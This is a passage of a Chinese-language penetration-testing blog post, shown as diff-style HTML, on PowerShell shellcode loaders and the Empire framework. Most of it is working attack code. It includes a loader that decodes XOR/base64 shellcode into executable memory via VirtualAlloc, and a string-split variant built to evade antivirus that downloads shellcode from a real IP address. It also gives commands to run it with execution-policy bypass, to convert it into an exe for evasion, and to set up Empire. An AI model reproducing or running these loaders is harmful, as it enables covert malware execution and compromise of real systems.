class="hljs-comment"># 定义func_get_delegate_type函数，创建一个新的委托类型，并返回改类型</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_delegate_type</span></span> &#123;<br>    <span class="hljs-comment"># 函数接收两个参数，$var_parameters 表示该委托类型所接受的参数为类型数组，是必需的参数。</span><br>    <span class="hljs-comment"># $var_return_type 表示该委托类型的返回值类型。默认为 [Void]</span><br>    <span class="hljs-keyword">Param</span> (<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">0</span>, <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-type">Type</span>[]] <span class="hljs-variable">$var_parameters</span>,<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)] [<span class="hljs-type">Type</span>] <span class="hljs-variable">$var_return_type</span> = [<span class="hljs-built_in">Void</span>]<br>    )<br>    <span class="hljs-comment"># 使用 .NET 的 Reflection.Emit 命名空间动态创建具有指定参数和返回类型的新委托类型。</span><br>    <span class="hljs-comment"># 然后它为该委托类型定义一个构造函数和 Invoke 方法，并返回类型对象。</span><br>    <span class="hljs-variable">$var_type_builder</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="hljs-built_in">New-Object</span> System.Reflection.AssemblyName(<span class="hljs-string">&#x27;ReflectedDelegate&#x27;</span>)), [<span class="hljs-type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="hljs-string">&#x27;InMemoryModule&#x27;</span>, <span class="hljs-variable">$false</span>).DefineType(<span class="hljs-string">&#x27;MyDelegateType&#x27;</span>, <span class="hljs-string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [<span class="hljs-type">System.MulticastDelegate</span>])<br>    <span class="hljs-variable">$var_type_builder</span>.DefineConstructor(<span class="hljs-string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [<span class="hljs-type">System.Reflection.CallingConventions</span>]::Standard, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-variable">$var_type_builder</span>.DefineMethod(<span class="hljs-string">&#x27;Invoke&#x27;</span>, <span class="hljs-string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, <span class="hljs-variable">$var_return_type</span>, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_type_builder</span>.CreateType()<br>&#125;<br><br><span class="hljs-comment"># 通过比较IntPtr类型的大小是否为8字节，来判断系统是否为64位</span><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-comment"># base64解码操作</span><br>    [<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$var_code</span> = [<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&#x27;...base64加密后的payload...&#x27;</span>)<br><br>    <span class="hljs-comment"># 将byte数组进行xor异或操作</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$var_code</span>.Count; <span class="hljs-variable">$x</span>++) &#123;<br>        <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] = <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] <span class="hljs-operator">-bxor</span> <span class="hljs-number">35</span><br>    &#125;<br><br>    <span class="hljs-comment"># Marshal 类：提供了一个方法集合，这些方法用于分配非托管内存、复制非托管内存块、将托管类型转换为非托管类型，此外还提供了在与非托管代码交互时使用的其他杂项方法。</span><br>    <span class="hljs-comment"># GetDelegateForFunctionPointer&lt;TDelegate&gt;(IntPtr)：[在 .NET Framework 4.5.1 和更高版本中受支持] 将非托管函数指针转换为指定类型的委托。</span><br>    <span class="hljs-variable">$var_va</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>]) ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>])))<br><br>    <span class="hljs-comment"># 申请一块内存</span><br>    <span class="hljs-variable">$var_buffer</span> = <span class="hljs-variable">$var_va</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero, <span class="hljs-variable">$var_code</span>.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)<br><br>    <span class="hljs-comment"># 将payload复制到内存</span><br>    [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$var_code</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$var_buffer</span>, <span class="hljs-variable">$var_code</span>.length)<br><br>    <span class="hljs-comment"># 执行内存中的payload</span><br>    <span class="hljs-variable">$var_runme</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="hljs-variable">$var_buffer</span>, (func_get_delegate_type <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]) ([<span class="hljs-built_in">Void</span>])))<br>    <span class="hljs-variable">$var_runme</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>修改后的powershell加载器</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_delegate_type_new</span></span> &#123;<br>    <span class="hljs-keyword">Param</span> (<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">0</span>, <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-type">Type</span>[]] <span class="hljs-variable">$var_parameters</span>,<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)] [<span class="hljs-type">Type</span>] <span class="hljs-variable">$var_return_type</span> = [<span class="hljs-built_in">Void</span>]<br>    )<br>    <span class="hljs-variable">$var_type_builder</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="hljs-built_in">New-Object</span> System.Reflection.AssemblyName(<span class="hljs-string">&#x27;ReflectedDelegate&#x27;</span>)), [<span class="hljs-type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="hljs-string">&#x27;InMemoryModule&#x27;</span>, <span class="hljs-variable">$false</span>).DefineType(<span class="hljs-string">&#x27;MyDelegateType&#x27;</span>, <span class="hljs-string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [<span class="hljs-type">System.MulticastDelegate</span>])<br>    <span class="hljs-variable">$var_type_builder</span>.DefineConstructor(<span class="hljs-string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [<span class="hljs-type">System.Reflection.CallingConventions</span>]::Standard, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-variable">$var_type_builder</span>.DefineMethod(<span class="hljs-string">&#x27;Inv&#x27;</span>+<span class="hljs-string">&#x27;oke&#x27;</span>, <span class="hljs-string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, <span class="hljs-variable">$var_return_type</span>, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_type_builder</span>.CreateType()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_proc_address_new</span></span> &#123;<br>    <span class="hljs-keyword">Param</span> (<span class="hljs-variable">$var_module</span>, <span class="hljs-variable">$var_procedure</span>)     <br>    <span class="hljs-variable">$var_unsafe_native_methods</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.GetAssemblies()<br>    <span class="hljs-variable">$var_unsafe_native_methods_news</span> = (<span class="hljs-variable">$var_unsafe_native_methods</span>  | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.GlobalAssemblyCache <span class="hljs-operator">-And</span> <span class="hljs-variable">$_</span>.Location.Split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>].Equals(<span class="hljs-string">&#x27;System.dll&#x27;</span>) &#125;).GetType(<span class="hljs-string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>)<br>    <span class="hljs-variable">$var_gpa</span> = <span class="hljs-variable">$var_unsafe_native_methods_news</span>.GetMethod(<span class="hljs-string">&#x27;GetProcAddress&#x27;</span>, [<span class="hljs-type">Type</span>[]] <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&#x27;System.Runtime.InteropServices.HandleRef&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_gpa</span>.Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>([<span class="hljs-type">System.Runtime.InteropServices.HandleRef</span>](<span class="hljs-built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="hljs-built_in">New-Object</span> IntPtr), (<span class="hljs-variable">$var_unsafe_native_methods_news</span>.GetMethod(<span class="hljs-string">&#x27;GetModuleHandle&#x27;</span>)).Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$var_module</span>)))), <span class="hljs-variable">$var_procedure</span>))<br>&#125;<br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br>    [<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$acode</span> = (<span class="hljs-built_in">New-Object</span> Net.WebClient).<span class="hljs-string">&quot;Down`l`oadData&quot;</span>(<span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>])<br>    <span class="hljs-variable">$var_va</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((func_get_proc_address_new kernel32.dll VirtualAlloc), (func_get_delegate_type_new <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>]) ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>])))<br>    <span class="hljs-variable">$var_buffer</span> = <span class="hljs-variable">$var_va</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero, <span class="hljs-variable">$acode</span>.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)<br>    [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$acode</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$var_buffer</span>, <span class="hljs-variable">$acode</span>.length)<br>    <span class="hljs-variable">$var_runme</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="hljs-variable">$var_buffer</span>, (func_get_delegate_type_new <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]) ([<span class="hljs-built_in">Void</span>])))<br>    <span class="hljs-variable">$var_runme</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero)<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204221142381.png" srcset="/img/loading.gif" lazyload alt="image-20240204221142381"></p>
+<p>下载文件</p>
+<p>通过接受本地或者远程的 payload 实现加载器与shellcode分离</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-ep</span> bypass <span class="hljs-operator">-f</span> d.ps1 new.bin<br><br>powershell <span class="hljs-literal">-ep</span> bypass <span class="hljs-operator">-f</span> d.ps1 http://<span class="hljs-number">139.155</span>.<span class="hljs-number">49.43</span>:<span class="hljs-number">8000</span>/shell1.bin<br></code></pre></td></tr></table></figure>
+
+<p>或者将<strong>powershell 转成 exe</strong>免杀</p>
+<blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/MScholtes/Win-PS2EXE">https://github.com/MScholtes/Win-PS2EXE</a>  </p>
+</blockquote>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">powershell.exe -ep bypass -command &quot;&amp;<span class="hljs-string">&#x27;.\ps2exe.ps1&#x27;</span> -inputFile <span class="hljs-string">&#x27;d.ps1&#x27;</span> -outputFile <span class="hljs-string">&#x27;d.exe&#x27;</span>&quot;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>基于上面的免杀使用流程</p>
+<p>将shellcode加载器变成exe</p>
+<p>也就是将下面这个变成exe</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_delegate_type_new</span></span> &#123;<br>    <span class="hljs-keyword">Param</span> (<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">0</span>, <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-type">Type</span>[]] <span class="hljs-variable">$var_parameters</span>,<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)] [<span class="hljs-type">Type</span>] <span class="hljs-variable">$var_return_type</span> = [<span class="hljs-built_in">Void</span>]<br>    )<br>    <span class="hljs-variable">$var_type_builder</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="hljs-built_in">New-Object</span> System.Reflection.AssemblyName(<span class="hljs-string">&#x27;ReflectedDelegate&#x27;</span>)), [<span class="hljs-type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="hljs-string">&#x27;InMemoryModule&#x27;</span>, <span class="hljs-variable">$false</span>).DefineType(<span class="hljs-string">&#x27;MyDelegateType&#x27;</span>, <span class="hljs-string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [<span class="hljs-type">System.MulticastDelegate</span>])<br>    <span class="hljs-variable">$var_type_builder</span>.DefineConstructor(<span class="hljs-string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [<span class="hljs-type">System.Reflection.CallingConventions</span>]::Standard, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-variable">$var_type_builder</span>.DefineMethod(<span class="hljs-string">&#x27;Inv&#x27;</span>+<span class="hljs-string">&#x27;oke&#x27;</span>, <span class="hljs-string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, <span class="hljs-variable">$var_return_type</span>, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_type_builder</span>.CreateType()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_proc_address_new</span></span> &#123;<br>    <span class="hljs-keyword">Param</span> (<span class="hljs-variable">$var_module</span>, <span class="hljs-variable">$var_procedure</span>)     <br>    <span class="hljs-variable">$var_unsafe_native_methods</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.GetAssemblies()<br>    <span class="hljs-variable">$var_unsafe_native_methods_news</span> = (<span class="hljs-variable">$var_unsafe_native_methods</span>  | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.GlobalAssemblyCache <span class="hljs-operator">-And</span> <span class="hljs-variable">$_</span>.Location.Split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>].Equals(<span class="hljs-string">&#x27;System.dll&#x27;</span>) &#125;).GetType(<span class="hljs-string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>)<br>    <span class="hljs-variable">$var_gpa</span> = <span class="hljs-variable">$var_unsafe_native_methods_news</span>.GetMethod(<span class="hljs-string">&#x27;GetProcAddress&#x27;</span>, [<span class="hljs-type">Type</span>[]] <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&#x27;System.Runtime.InteropServices.HandleRef&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_gpa</span>.Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>([<span class="hljs-type">System.Runtime.InteropServices.HandleRef</span>](<span class="hljs-built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="hljs-built_in">New-Object</span> IntPtr), (<span class="hljs-variable">$var_unsafe_native_methods_news</span>.GetMethod(<span class="hljs-string">&#x27;GetModuleHandle&#x27;</span>)).Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$var_module</span>)))), <span class="hljs-variable">$var_procedure</span>))<br>&#125;<br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br>    [<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$acode</span> = (<span class="hljs-built_in">New-Object</span> Net.WebClient).<span class="hljs-string">&quot;Down`l`oadData&quot;</span>(<span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>])<br>    <span class="hljs-variable">$var_va</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((func_get_proc_address_new kernel32.dll VirtualAlloc), (func_get_delegate_type_new <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>]) ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>])))<br>    <span class="hljs-variable">$var_buffer</span> = <span class="hljs-variable">$var_va</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero, <span class="hljs-variable">$acode</span>.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)<br>    [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$acode</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$var_buffer</span>, <span class="hljs-variable">$acode</span>.length)<br>    <span class="hljs-variable">$var_runme</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="hljs-variable">$var_buffer</span>, (func_get_delegate_type_new <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]) ([<span class="hljs-built_in">Void</span>])))<br>    <span class="hljs-variable">$var_runme</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero)<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后将第一个下载的文件改成echo &gt; cs2.ps1</p>
+<p>也就是下面这个文件</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204223822204.png" srcset="/img/loading.gif" lazyload alt="image-20240204223822204"></p>
+<p>然后从cs2.ps1 中提取出有用的payload部分</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204224023599.png" srcset="/img/loading.gif" lazyload alt="image-20240204224023599"></p>
+<p>后面的参数部分，嵌入到其他文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$enc</span>=[<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&#x27;...base64加密后的payload...&#x27;</span>)<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$enc</span>.Count; <span class="hljs-variable">$x</span>++) &#123;<br>    <span class="hljs-variable">$enc</span>[<span class="hljs-variable">$x</span>] = <span class="hljs-variable">$enc</span>[<span class="hljs-variable">$x</span>] <span class="hljs-operator">-bxor</span> <span class="hljs-number">35</span><br>&#125;<br><br><span class="hljs-variable">$infile</span> = [<span class="hljs-type">System.IO.File</span>]::WriteAllBytes(<span class="hljs-string">&quot;new.bin&quot;</span>,<span class="hljs-variable">$enc</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204224210497.png" srcset="/img/loading.gif" lazyload alt="image-20240204224210497"></p>
+<p>产生了一个新的文件</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204225409570.png" srcset="/img/loading.gif" lazyload alt="image-20240204225409570"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-ep</span> bypass <span class="hljs-operator">-f</span> d.ps1 new.bin<br>powershell <span class="hljs-literal">-ep</span> bypass <span class="hljs-operator">-f</span> d.ps1 http://<span class="hljs-number">139.155</span>.<span class="hljs-number">49.43</span>:<span class="hljs-number">8000</span>/shell1.bin<br></code></pre></td></tr></table></figure>
+
+<p>或者是将shellcode加载器变成exe</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shellcodeloader<span class="hljs-selector-class">.exe</span> new<span class="hljs-selector-class">.bin</span><br>shellcodeloader<span class="hljs-selector-class">.exe</span> http:<span class="hljs-comment">//139.155.49.43:8000/shell1.bin</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204231220345.png" srcset="/img/loading.gif" lazyload alt="image-20240204231220345"></p>
+</li>
+</ol>
+<h1 id="Powershell工具框架-Empire"><a href="#Powershell工具框架-Empire" class="headerlink" title="Powershell工具框架-Empire"></a>Powershell工具框架-Empire</h1><h2 id="Empire简介"><a href="#Empire简介" class="headerlink" title="Empire简介"></a>Empire简介</h2><p>Empire 是一个针对内网渗透的渗透测试框架  </p>
+<blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Empire">https://github.com/BC-SECURITY/Empire</a>  </p>
+</blockquote>
+<blockquote>
+<p>  Empire 是一个PowerShell后期漏洞利用工代理工具同时也是一款很强大的后渗透测神器，它建立在  密码学、安全通信和灵架构之上。Empire 实现了无需 Powershell.exe 就可运行 PowerShell  代理的功能。快速部署后期漏洞利用模块，从键盘记录器到Mimikatz，并且能够适应通信躲避网络  检测，所有的这些功能都封装在一个以实用性为重点的框架中。  </p>
+</blockquote>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>kali直接安装</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> powershell-empire<br></code></pre></td></tr></table></figure>
+
+
+
+<p>docker 拉取镜像docker </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 拉取镜像</span><br><span class="hljs-attribute">docker</span> pull bcsecurity/empire:latest<br><br><span class="hljs-comment"># 运行服务器并打开 rest api 和套接字端口</span><br><span class="hljs-attribute">docker</span> run -dit -p <span class="hljs-number">1337</span>:<span class="hljs-number">1337</span> -p <span class="hljs-number">5000</span>:<span class="hljs-number">5000</span> bcsecurity/empire:latest<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>修改kali 的配置文件&#x2F;etc&#x2F;powershell-empire&#x2F;client&#x2F;config.yaml 的 servers：</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205002854574.png" srcset="/img/loading.gif" lazyload alt="image-20240205002854574"></p>
+<p>修改成自己的地址</p>
+<p>然后直接执行这个命令</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205002917599.png" srcset="/img/loading.gif" lazyload alt="image-20240205002917599"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205002952278.png" srcset="/img/loading.gif" lazyload alt="image-20240205002952278"></p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>基本逻辑都是一样的，首先进入到listeners</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205003034363.png" srcset="/img/loading.gif" lazyload alt="image-20240205003034363"></p>
+<p><img src="D:\hexo\source_posts\渗透\Powershell渗透框架.assets\image-20240205003150450.png" srcset="/img/loading.gif" lazyload alt="image-20240205003150450"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205003509499.png" srcset="/img/loading.gif" lazyload alt="image-20240205003509499"></p>
+<p>创建一个http的监听器，根据提示填写</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004120288.png" srcset="/img/loading.gif" lazyload alt="image-20240205004120288"></p>
